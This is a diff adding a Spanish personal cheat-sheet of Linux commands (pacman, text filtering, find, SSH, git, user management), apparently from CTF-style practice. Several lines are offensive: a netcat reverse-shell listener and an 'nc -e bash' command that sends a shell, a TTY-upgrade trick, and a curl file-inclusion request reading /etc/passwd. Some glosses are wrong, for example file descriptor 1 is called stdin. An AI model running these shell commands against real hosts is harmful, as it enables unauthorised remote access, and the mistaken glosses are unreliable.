@@ -1,0 +1,289 @@
+!$ = obtiene el ultimo argumento de comando ejecutadot
+$? = retorna codigo de estado de ejecucion (0 exitoso) (diferente de cero != 0 error)
+
+mount | column -t = muestra informacion ordanada en columnas
+cat /etc/passwd | column -t -s : = ordena informacion en forma de columnas apartir del delimitador ":"
+
+# script para comprobar si un dominio esta activo
+	puede tener otros usos
+
+while true
+do
+	ping -c 1 www.google.com > /dev/null 2>&1 && break
+done;
+
+
+ps aux | sort -nk 4 = despliega informacion de procesos ordenado por uso de memoria
+ps aux | sort -nk 3 = muestra informacion de proceso ordenado por uso de CPU
+
+
+cd - = ir al directorio anterior no es lo mismo cd ..
+
+sudo !! = ejecutar como superusuario el comando anterior
+
+find . -name '*.png' -type f -print | xargs tar -cvzf pics.tar.gz = busca ficheros con extension png los imprime y los comprime utilizando el comando xargs
+ls /etc/*.conf | xargs -i cp {} /home/likegeeks/Desktop/out
+
+
+sudo pacman -Qtdq = muestra los paquetes huerfanos
+
+sudo pacman -Rns $(pacman -Qtdq) = elimina paquetes huerfanos
+
+#Instalar paquetes
+pacman -S “paquete” #Instala un paquete.
+pacman -Sy “paquete” #Sincroniza repositorios e instala el paquete.
+
+# Actualizar paquetes
+pacman -Sy #Sincroniza repositorios.
+pacman -Syy #Fuerza la sincronización de repositorios incluso para paquetes que parecen actualizados.
+pacman -Syu #Sincroniza repositorios y actualiza paquetes.
+pacman -Syyu #Fuerza sincronización y actualiza paquetes.
+pacman -Su #Actualiza paquetes sin sincronizar repositorios.
+
+# Buscar paquetes
+pacman -Ss “paquete” #Busca un paquete.
+pacman -Si “paquete” #Muestra información detallada de un paquete.
+pacman -Sg “grupo” #Lista los paquetes que pertenecen a un grupo.
+pacman -Qs “paquete” #Busca un paquete YA instalado.
+pacman -Qi “paquete” #Muestra información detallada de un paquete YA instalado.
+pacman -Qdt #Muestra paquetes huerfanos.
+
+# Eliminar paquetes
+pacman -R “paquete” #Borra paquete sin sus dependencias.
+pacman -Rs “paquete” #Borra paquete y sus dependencias no utilizadas.
+
+
+
+lsof -i :80 = despliaga el estado de un servicio (en este caso en el puerto 80)
+
+curl -s 'http://localhost/example.php?file=/etc/passwd' | grep 'sh$' = realiza un get en modo silencioso sin que te muetre el verbose 
+	y se hace filtro con grep para mostrar todas las lineas que terminan en sh
+
+iwconfig | awk '{print $1}' | sed '/^\s*$/d' = muestra las interfaces haciendo filtro por el primer argumento y quitando los espacios
+
+
+echo 'En un lugar de la Mancha' | base64 = codifica en base 64
+
+echo '67gjhghjghjygjh==' | base64 -d = decodifica de base64
+
+script /dev/null -c bash = comando para obtener una terminal interactiva
+
+nc -nlvp 12240 = permite escuchar por una coneccion por el puerto mencionado reverse shell
+
+nc -e /usr/bin/bash 127.0.0.1 1212 = se conecta a la maquina y puerto mencionado enviando una shell intercativa 
+
+$(cmd) = retorna el output ejecutado a nivel de sistema
+
+find ./ -type f -printf "%f\t%p\t%u\t%g\t%m\n" | column -t = busca de forma recursiva exclusivamente archivos y se le formatea 
+	para que muestre el nombre del archivo,path,usuario,grupo,permisos y por ultimo se le ordena con tabulacion
+
+
+
+find . -name filename | xargs cat = busca de forma recursiva los archivos que tengan el nombre filename
+					y se usa xargs para hacer uso del output del comando previo para ejecutar el comando cat
+
+
+chattr +i -V = establece privilegios especiales, en este caso la flag i hay muchas mas
+	por ejemplo con esta flag ni el usuario root podra realiar algun cambio
+	para quitar la flag se usa el argumento -i
+
+lsattr = visualiza privilegios especiales establecidos
+
+
+find . -type f -readable ! -executable -size 1033c | xargs cat | xargs = busca un archivo que sea humanamente legible que no sea ejecutable
+	y que pese 1033 bytes , el ultimo xargs para quitar espacios y lineas blancos
+
+tr 'a' 'A' = remplaza un caracter por otro
+
+tr -d 'd' = elimina un caracter
+
+cat file | head -n 1 = muestra la primera linea
+cat file | tail -n 3 = muestra las tres ultimas filas
+
+cat file.txt | awk 'NR==2' = muestra el contenido de la linea numero 2
+
+cat file.txt | sed 's/data/data1/' = remplaza data por data1 en el primer match
+
+cat file.txt | sed 's/data/data1/' = remplaza data por data1 en todo el output , busca todas las coincidencias y las remplaza
+
+cat file.txt | sed 's/^ *//' = busca toda expresion que comienze con espacio hasta el final del texto 
+	y lo sustituye con nada o null
+
+
+cat file.txt | grep "^hola$" -n = busca exclusivamente lineas que empiezen y terminen en hola, y muestra el numero de linea
+
+cat file.txt | sed '/^\s*$/d' = quita los espacios en blanco usando una expresion regular
+
+codigo 2 = stderr
+codigo 1 = stdin
+
+cat file.txt 2>/dev/null = redirigir el stderr al dev null para que no se visualize la traza de errores
+
+firefox >/dev/null 2>&1 = redirigir tanto el stderr y stdin al dev/null 
+
+grep 'criterio' file.txt = filtra por el criterio especifico
+
+awk '/criterio/' file.txt = lo mismo que grep, hace un filtro por el criterio
+
+echo 'Hola      ariel ronald' | cut -d ' ' -f 7 = realiza un filtro por el delimitador ' ' y muestra el argumento numero 7
+
+cat data.txt | awk '{print $1}' = muestra el argumento numero 1
+
+cat data.txt | awk 'NF{print $NF}' = despliega el ultimo argumento
+
+
+echo 'hola ariel ronald fernandez mercado' | rev | awk '{print $1}' | rev = revierte una cadena , luego muestra el primer argumento , luego 
+	nuevamente lo revierte
+
+
+cat data.txt | sort | uniq -u = muestra solo lineas unicas previamente requiere un ordenamiento
+
+
+cat /etc/passwd | while read line; do echo $line; done = lee el archivo , luego recorre el archivo con un while
+
+while read line; do echo $line; done < /etc/passwd = lo mismo que el anterior pero mas optimo
+
+contador=1; while read line; do echo "linea $contador: $line"; let contador+=1; done < /etc/passwd = lo mismo pero dandole cierto formato
+
+cat data.txt | base64 -d = decodifica de base64 a su valor original 
+
+cat data.txt | tr ' ' '\n' = remplaza los espacios en blanco por nuevas lineas
+
+cat data.txt | sed 's/ /\n/g' = lo mismo que el anteror usando el comando SED
+
+
+
+cat data.txt | tr '[G-ZA-Fg-za-f]' '[T-ZA-St-za-s]' = hace una rotacion de 13 caracteres
+
+
+cat data.txt | xxd = convierte a hexadecimal
+cat data.txt | xxd -ps = lo mismo pero con otro formato mas plano
+cat data.txt | xxd -r = revierte de exadecimal a texto original
+
+SSH
+Autorizacion ssh con clave privada
+existen dos maneras de autenticarse por ssh con clave de autiracion 
+
+1.- la primera es utilizando un fichero de authorizacion
+	que debe estar configirada en el servidor ssh
+	para esto se usa la clave publica generada en el cliente y renonbrada en el servidor como "authorized-keys"
+	de esta manera el usuario podra acceder sin que el server ssh requiera un passwrd
+		considerar que en el servidor se debe configurar el fichero shhd_config con el valor "PermitRootLogin yes"
+		normalmente aunque en algunos servidores no esnecesario, no esta demas tenerlo en cuenta
+
+systemctl start sshd = iniciar servicio ssh
+systemctl status sshd = verificar estado servicio
+
+ssh-keygen = permite genrar clave publica y privada
+
+lsof -i :22 = permite verificar el estado de algun servicio en el puerto especifico
+
+2.- la segunda es creando un fichero de identidad autorizada para
+	luego pasarselo a los usuarios 
+
+ssh-copy-id -i id_rsa user@server = permite crear un fichero de identidad autorizada
+
+echo '' > /dev/tcp/127.0.0.1 && echo 'puerto abierto' || echo 'puerto cerrado' = permite verificar si un puerto esta abierto
+
+bash -c "cmd" 2>/dev/null = ejecuta un comando a nivel de sistema
+
+
+echo 'En un lugar de la Mancha!!!' | nc localhost 30000 = hace un send de la cadena al servidor local con puerto 30000 usando netcat
+
+telnet localhost 30000 = lo mismo que el anterior usando telnet
+
+openssl s_client -connect 127.0.0.1:30001 = permite conectarse a un servicio por coneccion cifrada
+
+mktemp -d = crea un directorio en el directorio temporal
+
+cat file.txt | grep -E "ariel|ronald" = permite filtrar por multiples criterios
+
+cat file.txt | grep -V "wer" = filtra todo menos la del criterio
+
+
+diff file1 file2 = muestra las diferencias entre file2 y file 1
+
+cat file | md5sum = retorna el hash en MD5
+
+TAREA CRON = es una tarea que se ejecuta a intervalos regulares de tiempo , a nivel sistema
+
+
+watch -n 100 ls -l = ejecuta un comando cada 100 segundos , se usa para monitorear una accion cad cierto tiempo
+
+git log -p = permite visualizar los distintos commits sobre el repositorio con formato pagging ademas
+
+git branch -r = visualiza los distintos branch del repositorio
+
+git checkout name_branch = cambia de branch
+
+git tag = muestra las etiquetas de un repo
+git show name_tag = muestra el contenido de una etiqueta
+
+git add file.txt = agrega un fichero al repositorio
+
+git commit -m "commit numero 1" = agrega un commit al repositorio
+
+git push -u name repo branch = "hace un send push del commit al server"
+
+cat /etc/shells = muestra todas las terinales instaladas
+
+echo $SHELL = muestra la terminal asignada al usuario
+
+cat /etc/passwd | grep 'sh$' | awk '{print }' FS=':' = filtra todos los usuarios imprimiendo el primer argumento usando como delimitador ':' awk 
+[200~cat /etc/passwd | grep sh$ | cut -d ':' -f 1= filtra todos los usuarios imprimiendo el primer argumento usando como delimitador ':'  
+cat /etc/passwd | grep sh$ | cut -d ':' -f 1= filtra todos los usuarios imprimiendo el primer argumento usando como delimitador ':' cut 
+useradd -m -s /usr/bin/bash user1 = agrega un usuario , creando directorio de trabajo y asignando la shell para el user
+chown root user1 = asigna el propietario del directorio
+chgrp group directory = asigna el grupo del directorio
+chown root:users = asigna el propietario y grupo del directorio
+usermod -a -G group user = asigna un grupo al usuario
+chattr +i -V file.txt = establece una flag especial para que ni root pueda eliminarlo
+lsattr file.txt = muestra los flags especiales asignados al fichero
+
+
+hostname -I = despliega la direccion IP asignada al dispositivo
+find . = busquea recursiva desde el directorio actual
+find . -type f = busqueda recursiva filtrando solo ficheros
+find . -type f -printf "%f\t%p\t%u\t%g\t%m" | column -t = busquea recursiva de solo ficheros formateando con printf y formateano por columnas
+
+find . -name file = busca un fichero por el nombre
+time = mide el tiempo de ejecucion de un comando
+file = retorna el tipo de fichero o recurso
+find . -type f -readable ! -executable -size 1033c = busca un fichero que sea humanamente legible ademas no sea ejecutable y su tamano en bytes sea 1033
+cat file.txt | sed 's/^ *//' = reemplaza todo aquello que empieze en espacio y to lo que le siga , por vacio, null nada
+cat file.txt | se '/^\s*$/d' = elimina too aquello que comienze en espacio hasta el final
+
+find / -type f -user pepito -group pepe -size 23c = busca un fichero que su propietario sea peito su grupo pepe y su tamano en bytes sea 23 bytes
+
+awk '/millnth/' file.txt =  hace un filtro sobre el fichero 
+
+cat file.txt | awk '{print $1}' = muestra el primer argumento del output
+cat file.txt | awk 'NF{print $NF}' = muestra el ultimo argumento
+cat file.txt | rev =  revierte la cadena
+
+awk 'NR==123' = imprime la linea especificada
+
+grep filyer file.txt -n =  imprime numero de linea del output
+ 
+cat file | sort | uniq -u = hace un ordenamiento y deveulve filas unicas
+cat file | wc -l = despliega numerod de filas
+cat file | wc -c = retorna numero de caracteres
+
+string file.txt = muestra solo los caracteres imprimibles
+
+cat file.txt | tr '[G-ZA-Fg-za-f]' '[T-ZA-St-za-s]' = hace una rotacion de 12 caracteres a partir de un caracter 'G'
+setxkkbmap es = cambia distribucion de teclado al espanol
+
+nc nlvp 4646 = pone en escucha nc en el puerto especificado
+lsof i :8080 = muestra el proceso que se esta ejecutando en el puerto 8080 normalmente en este caso hhtp
+pwdx 8055 = muestra la ruta absoluta a partir del cual se lanzo un proceso apartir del pid 
+
+echo 'Hello' > /dev/tcp/127.0.0.1/30000 = hace un send o envio de una cadena al equipo local puerto 30000
+
+echo 'Hello' | nc 127.0.0.1 30000 = envia una cadena al equipo local puerto 30000
+
+openssl s_client -connect 127.0.0.1:20000 = realiza una coneccion de forma cifrada por ssl al equipo especificado
+
+nmap -p32000-33000 --open -T5 -v -n 127.0.0.1 = realiza un escaneo de puertos en el rango indicado sin resolucion de DNS 
+
+set shell=/bin/bash = establece la variable shell con la terminal especificada
